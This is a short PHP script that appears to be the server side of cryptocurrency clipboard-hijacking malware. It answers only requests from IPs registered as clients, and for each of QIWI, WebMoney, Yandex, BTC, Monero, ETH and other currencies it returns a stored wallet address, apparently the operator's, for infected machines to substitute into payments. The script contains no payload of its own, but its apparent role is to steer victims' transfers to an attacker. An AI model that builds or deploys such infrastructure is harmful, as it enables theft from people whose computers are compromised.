<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
	$client = get_client($_SERVER["REMOTE_ADDR"]);
	
	if(empty($client)) {
		echo "";
		return;
	}
	if(isset($_GET["wallet"])){
switch($_GET["wallet"]){
case "QIWI":
echo QIWI;
break;
case "WMR":
echo WMR;
break;
case "WMZ":
echo WMZ;
break;
case "Yandex":
echo Yandex;
break;
case "BTC":
echo BTC;
break;
case "Monero":
echo Monero;
break;
case "ZEC":
echo ZEC;
break;
case "ETH":
echo ETH;
break;
case "DOGE":
echo DOGE;
break;
case "LTC":
echo LTC; 
break;
case "DASH":
echo DASH;
break;
}
}
	
